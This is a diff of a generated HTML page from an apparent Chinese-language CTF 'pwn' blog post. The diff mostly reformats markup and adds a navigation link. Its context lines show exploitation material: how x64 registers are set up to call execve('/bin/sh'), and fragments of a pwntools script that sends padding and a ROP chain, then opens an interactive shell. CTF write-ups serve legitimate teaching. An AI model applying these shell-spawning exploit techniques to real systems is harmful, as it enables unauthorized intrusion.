@@ -90,12 +90,10 @@
 <li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/"target="_blank">參考x64 system call</a></li>
 </ul>
 <h3 id="x64呼叫慣例">x64呼叫慣例</h3>
-<p>:::info
-rdi: 第一個參數存放的暫存器
+<pre><code>rdi: 第一個參數存放的暫存器
 rsi: 第二個參數存放的暫存器
 rdx: 第三個參數存放的暫存器
-:::</p>
-<p>舉例來說，呼叫 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> <br>
+</code></pre><p>舉例來說，呼叫 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> <br>
 暫存器會呈現</p>
 <pre><code>rax = 0x3b (system call 的編號)
 rdi = address of &quot;/bin/sh&quot;
@@ -125,7 +123,7 @@ r.recvuntil(&quot;\n&quot;)
 r.send('a'*30+'\x00'+'a'*9 + rop)
 
 r.interactive()
-</code></pre></article><section class="article labels"><a class="category" href=/categories/ctf-pwn/>CTF pwn</a><a class="tag" href=/tags/ctf/>CTF</a><a class="tag" href=/tags/pwn/>pwn</a></section><section class="article navigation"><p><a class="link" href="/posts/hugotut/"><span class="li">&rarr;</span>Hugo Tutorial</a class="link">
+</code></pre></article><section class="article labels"><a class="category" href=/categories/ctf-pwn/>CTF pwn</a><a class="tag" href=/tags/ctf/>CTF</a><a class="tag" href=/tags/pwn/>pwn</a></section><section class="article navigation"><p><a class="link" href="/posts/sast/"><span class="li">&larr;</span>靜態分析工具介紹</a></p><p><a class="link" href="/posts/hugotut/"><span class="li">&rarr;</span>Hugo Tutorial</a class="link">
     </p></section></div><section id="footer" class="footer"><div class="footer-wrap">
     <p class="copyright">©2020 Notepadium.</p>
     <p class="powerby"><span>Powered by </span><a href="https://gohugo.io" 
